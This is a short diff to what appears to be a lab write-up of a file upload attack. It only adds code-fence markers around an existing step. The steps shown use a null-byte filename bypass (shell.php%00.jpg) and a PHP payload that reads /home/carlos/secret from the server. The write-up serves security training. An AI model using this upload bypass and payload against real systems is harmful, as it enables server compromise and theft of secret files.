@@ -23,9 +23,9 @@ shell.php%00.jpg
 Content-Type: image/jpeg
 
 5. I replaced the image contents with the following PHP payload:
-
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
-
+```
 6. I sent the modified request.
 
 7. The application accepted the upload because it validated the filename before properly handling the null byte (%00).
